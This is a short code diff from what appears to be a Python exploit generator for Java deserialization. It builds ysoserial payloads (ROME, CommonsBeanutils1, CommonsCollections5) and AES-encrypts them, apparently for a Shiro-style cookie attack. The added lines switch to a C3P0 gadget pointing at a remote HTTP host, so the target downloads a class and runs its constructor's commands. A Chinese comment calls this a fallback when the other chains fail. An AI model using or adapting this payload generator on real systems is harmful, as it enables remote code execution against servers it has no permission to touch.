@@ -21,7 +21,9 @@ def generator2(key):
 	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'ROME', 'ping 7777777777.rome.x.y.z'], stdout=subprocess.PIPE)
 	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.8.0_201\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Cl2', 'calc'], stdout=subprocess.PIPE)
 	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.8.0_201\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Cl5', '1'], stdout=subprocess.PIPE)
-	popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsCollections5', 'calc'], stdout=subprocess.PIPE)
+	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsCollections5', 'calc'], stdout=subprocess.PIPE)
+	# 前面都不能用的时候拿来用一下，从远程http服务下载一个class文件，class里的构造方法执行命令即可，原理参考：https://xz.aliyun.com/t/6965
+	popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'C3P0', 'http://49.x.y.z:8888/:Test'], stdout=subprocess.PIPE)
 
 	BS = AES.block_size
 	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
